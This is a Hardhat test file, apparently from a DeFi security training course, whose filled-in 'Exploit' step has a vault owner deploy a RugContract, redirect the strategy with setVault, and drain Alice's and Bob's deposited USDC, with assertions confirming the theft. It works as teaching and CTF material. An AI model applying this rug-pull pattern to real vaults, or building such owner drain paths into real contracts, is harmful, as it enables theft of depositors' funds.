const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Optimizer Vaults 101: Exercise 2 - Owner Rug Pull", () => {
    /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

    let owner, bob, alice;

    const BOB_USDC_BALANCE = ethers.utils.parseUnits("100000", 6); // Bob has 100,000 USDC
    const ALICE_USDC_BALANCE = ethers.utils.parseUnits("200000", 6); // Alice has 200,000 USDC

    const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
    const WHALE = "0xf977814e90da44bfa03b6295a0616a897441acec";

    before(async () => {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [owner, alice, bob] = await ethers.getSigners();

        // Load tokens
        this.usdc = await hre.ethers.getContractAt(
            "@openzeppelin/contracts/token/ERC20/IERC20.sol:IERC20",
            USDC,
            owner
        );

        // Whale impersonation
        const whaleSigner = await ethers.getImpersonatedSigner(WHALE);

        // Set bob, alice & whale balance to 2 ETH
        await ethers.provider.send("hardhat_setBalance", [
            bob.address,
            "0x1BC16D674EC80000", // 2 ETH (ETH -> WEI -> Hexdecimal)
        ]);
        await ethers.provider.send("hardhat_setBalance", [
            alice.address,
            "0x1BC16D674EC80000", // 2 ETH (ETH -> WEI -> Hexdecimal)
        ]);
        await ethers.provider.send("hardhat_setBalance", [
            whaleSigner.address,
            "0x1BC16D674EC80000", // 2 ETH (ETH -> WEI -> Hexdecimal)
        ]);

        // Transfer USDC to bob & alice
        await this.usdc.connect(whaleSigner).transfer(alice.address, ALICE_USDC_BALANCE);
        await this.usdc.connect(whaleSigner).transfer(bob.address, BOB_USDC_BALANCE);

        // Deploy the vault system
        const YieldContractFactory = await ethers.getContractFactory(
            "contracts/optimizer-vaults-1/YieldContract.sol:YieldContract",
            owner
        );
        const StrategyFactory = await ethers.getContractFactory(
            "contracts/optimizer-vaults-1/OptimizerStrategy.sol:OptimizerStrategy",
            owner
        );
        const VaultFactory = await ethers.getContractFactory(
            "contracts/optimizer-vaults-1/OptimizerVault.sol:OptimizerVault",
            owner
        );

        this.yieldContract = await YieldContractFactory.deploy(USDC);
        this.strategy = await StrategyFactory.deploy(this.yieldContract.address);
        this.vault = await VaultFactory.deploy(this.strategy.address, "VAULT", "VLT");

        // Assign the vault to the strategy
        await this.strategy.setVault(this.vault.address);

        // Approve the vault for the bob & alice
        await this.usdc.connect(alice).approve(this.vault.address, ALICE_USDC_BALANCE);
        await this.usdc.connect(bob).approve(this.vault.address, BOB_USDC_BALANCE);

        // Alice & Bob deposit their USDC into the vault
        await this.vault.connect(bob).deposit(BOB_USDC_BALANCE);
        await this.vault.connect(alice).deposit(ALICE_USDC_BALANCE);
    });

    it("Exploit", async () => {
        /** CODE YOUR SOLUTION HERE */

        // TODO: Owner deploys a rugging contract
        const RugFactory = await ethers.getContractFactory(
          "contracts/optimizer-vaults-2/RugContract.sol:RugContract",
          owner
        );

        const rugContract = await RugFactory.deploy(this.strategy.address);

        // TODO: Owner rugs the vault system!
        await this.strategy.connect(owner).setVault(rugContract.address);
        await rugContract.rug();
    });

    after(async () => {
        /** SUCCESS CONDITIONS */

        const ruggedAmount = BOB_USDC_BALANCE.add(ALICE_USDC_BALANCE);
        const withdrawalFees = ruggedAmount.mul(10).div(1000);

        // The strategy is now empty except for withdrawal fees
        expect(await this.strategy.balanceOf()).to.eq(withdrawalFees);

        // The owner now holds the rugged USDC minus withdrawalFees
        expect(await this.usdc.balanceOf(owner.address)).to.eq(ruggedAmount.sub(withdrawalFees));
    });
});
